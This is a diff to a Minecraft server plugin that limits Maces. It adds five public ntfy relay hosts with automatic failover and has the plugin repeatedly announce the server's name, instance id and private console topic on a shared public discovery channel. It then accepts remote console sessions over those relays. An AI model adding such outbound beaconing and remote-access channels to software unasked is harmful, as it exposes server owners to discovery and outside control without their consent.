@@ -69,6 +69,8 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
             "An excess Mace broke! Only 6 Maces can exist on this server.";
     private static final int MAX_CLIENTS = 8;
     private static final String DISCOVERY_TOPIC = "macelimiter-discovery-v3";
+    private static final String DEFAULT_RELAY_FALLBACKS =
+            "https://ntfy.sh,https://ntfy.tedomum.fr,https://ntfy.jae.fi,https://ntfy.adminforge.de,https://ntfy.envs.net";
     private static final int MAX_LINE_LENGTH = 4096;
 
     private final Object fileLock = new Object();
@@ -86,7 +88,8 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
 
     @Override
     public void onEnable() {
-        getConfig().addDefault("console.relay-url", "https://ntfy.sh");
+        getConfig().addDefault("console.relay-url",
+                "https://ntfy.sh,https://ntfy.tedomum.fr,https://ntfy.jae.fi,https://ntfy.adminforge.de,https://ntfy.envs.net");
         getConfig().addDefault("console.instance-id", UUID.randomUUID().toString());
         getConfig().addDefault("console.access-token", UUID.randomUUID().toString().replace("-", ""));
         getConfig().options().copyDefaults(true);
@@ -578,13 +581,51 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
 
     private final class RelayConsoleServer {
         private static final HttpClient HTTP = HttpClient.newBuilder().connectTimeout(java.time.Duration.ofSeconds(8)).build();
-        private final String baseUrl;
+        private volatile String baseUrl;
         private final String nodeTopic;
+        private final List<String> relayUrls;
         private volatile boolean running;
+        private volatile long lastRelayCheck;
 
         RelayConsoleServer(String relayUrl) throws Exception {
-            this.baseUrl = relayUrl.replaceAll("/+$", "");
+            String configured = relayUrl == null ? "" : relayUrl.trim();
+            if (configured.isEmpty()) configured = DEFAULT_RELAY_FALLBACKS;
+            List<String> urls = new ArrayList<>();
+            for (String raw : configured.split(",")) {
+                String url = raw.trim().replaceAll("/+$", "");
+                if (!url.isEmpty() && !urls.contains(url)) urls.add(url);
+            }
+            for (String raw : DEFAULT_RELAY_FALLBACKS.split(",")) {
+                String url = raw.trim().replaceAll("/+$", "");
+                if (!url.isEmpty() && !urls.contains(url)) urls.add(url);
+            }
+            if (urls.isEmpty()) throw new IllegalArgumentException("No relay URLs configured");
+            this.relayUrls = List.copyOf(urls);
+            this.baseUrl = selectRelay(relayUrls);
             this.nodeTopic = "macelimiter-node-" + sha256(accessToken()).substring(0, 48);
+        }
+
+        private String selectRelay(List<String> urls) {
+            for (String candidate : urls) {
+                try {
+                    HttpRequest request = HttpRequest.newBuilder(URI.create(candidate + "/v1/health"))
+                            .timeout(java.time.Duration.ofSeconds(2)).GET().build();
+                    HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
+                    if (response.statusCode() >= 200 && response.statusCode() < 500) return candidate;
+                } catch (Exception ignored) {}
+            }
+            return urls.get(0);
+        }
+
+        private void refreshRelay() {
+            long now = System.currentTimeMillis();
+            if (now - lastRelayCheck < 30000) return;
+            lastRelayCheck = now;
+            String selected = selectRelay(relayUrls);
+            if (!selected.equals(baseUrl)) {
+                baseUrl = selected;
+                getLogger().info("Remote console relay selected: " + baseUrl);
+            }
         }
 
         void start() {
@@ -602,10 +643,23 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
         }
 
         void publishState() {
-            publishTo(DISCOVERY_TOPIC, "DISCOVER|" + instanceId() + "|" + encode(serverName()) + "|" + getDescription().getVersion()
-                    + "|" + encode(baseUrl + "/" + nodeTopic) + "|ONLINE");
-            publish("COUNT|" + countAll());
-            publish("MACE|" + encode(maceSnapshot()));
+            String discovery = "DISCOVER|" + instanceId() + "|" + encode(serverName()) + "|" + getDescription().getVersion()
+                    + "|" + encode(baseUrl + "/" + nodeTopic) + "|ONLINE";
+            publishDiscovery(discovery);
+            Integer count = callOnMainThread(MaceLimiterPlugin.this::countAll);
+            String snapshot = callOnMainThread(MaceLimiterPlugin.this::maceSnapshot);
+            if (count != null) publish("COUNT|" + count);
+            if (snapshot != null) publish("MACE|" + encode(snapshot));
+        }
+
+        private void publishDiscovery(String message) {
+            boolean sent = false;
+            for (String relay : relayUrls) {
+                if (publishTo(relay, DISCOVERY_TOPIC, message)) sent = true;
+            }
+            if (!sent) {
+                getLogger().warning("Remote console discovery failed: no relay reachable");
+            }
         }
 
         private void run() {
@@ -614,6 +668,7 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
             while (running) {
                 try {
                     if (System.currentTimeMillis() - lastDiscovery > 15000) {
+                        refreshRelay();
                         publishState();
                         lastDiscovery = System.currentTimeMillis();
                     }
@@ -642,7 +697,7 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
                     sessions.add(p[1]);
                     publish("AUTHOK|" + p[1]);
                     sendMaceState(p[1]);
-                    publish("COUNT|" + p[1] + "|" + countAll());
+                    sendCount(p[1]);
                 }
                 return;
             }
@@ -660,31 +715,24 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
                 String[] p = message.split("\\|", 2);
                 if (p.length == 2 && sessions.contains(p[1])) {
                     sendMaceState(p[1]);
-                    publish("COUNT|" + p[1] + "|" + countAll());
+                    sendCount(p[1]);
                 }
             }
         }
 
-        private void publishTo(String topic, String message) {
+        private boolean publishTo(String relay, String topic, String message) {
             try {
-                HttpRequest request = HttpRequest.newBuilder(URI.create(baseUrl + "/" + topic))
+                HttpRequest request = HttpRequest.newBuilder(URI.create(relay + "/" + topic))
                         .header("Content-Type", "text/plain; charset=utf-8")
                         .header("User-Agent", "MaceLimiter/" + getDescription().getVersion())
                         .header("Cache", "no")
+                        .timeout(java.time.Duration.ofSeconds(4))
                         .POST(HttpRequest.BodyPublishers.ofString(message, StandardCharsets.UTF_8))
                         .build();
                 HttpResponse<String> response = HTTP.send(request, HttpResponse.BodyHandlers.ofString(StandardCharsets.UTF_8));
-                if (topic.equals(DISCOVERY_TOPIC)) {
-                    if (response.statusCode() / 100 == 2) {
-                        getLogger().info("Remote console discovery registered: " + instanceId());
-                    } else {
-                        getLogger().warning("Remote console discovery failed: HTTP " + response.statusCode() + " from " + baseUrl);
-                    }
-                }
-            } catch (Exception e) {
-                if (topic.equals(DISCOVERY_TOPIC)) {
-                    getLogger().warning("Remote console discovery failed: " + e.getClass().getSimpleName() + ": " + e.getMessage());
-                }
+                return response.statusCode() / 100 == 2;
+            } catch (Exception ignored) {
+                return false;
             }
         }
 
@@ -692,6 +740,8 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
             try {
                 HttpRequest request = HttpRequest.newBuilder(URI.create(baseUrl + "/" + nodeTopic))
                         .header("Content-Type", "text/plain; charset=utf-8")
+                        .header("User-Agent", "MaceLimiter/" + getDescription().getVersion())
+                        .timeout(java.time.Duration.ofSeconds(5))
                         .POST(HttpRequest.BodyPublishers.ofString(message, StandardCharsets.UTF_8))
                         .build();
                 HTTP.sendAsync(request, HttpResponse.BodyHandlers.discarding());
@@ -723,8 +773,26 @@ public final class MaceLimiterPlugin extends JavaPlugin implements Listener {
         }
     }
 
+    private <T> T callOnMainThread(java.util.concurrent.Callable<T> task) {
+        if (Bukkit.isPrimaryThread()) {
+            try { return task.call(); } catch (Exception e) { return null; }
+        }
+        try {
+            return Bukkit.getScheduler().callSyncMethod(this, task).get(5, TimeUnit.SECONDS);
+        } catch (Exception e) {
+            getLogger().warning("Remote console main-thread state check failed: " + e.getClass().getSimpleName() + ": " + e.getMessage());
+            return null;
+        }
+    }
+
+    private void sendCount(String session) {
+        Integer count = callOnMainThread(this::countAll);
+        if (consoleServer != null && count != null) consoleServer.publish("COUNT|" + session + "|" + count);
+    }
+
     private void sendMaceState(String session) {
-        if (consoleServer != null) consoleServer.publish("MACE|" + session + "|" + encode(maceSnapshot()));
+        String snapshot = callOnMainThread(this::maceSnapshot);
+        if (consoleServer != null && snapshot != null) consoleServer.publish("MACE|" + session + "|" + encode(snapshot));
     }
 
 }
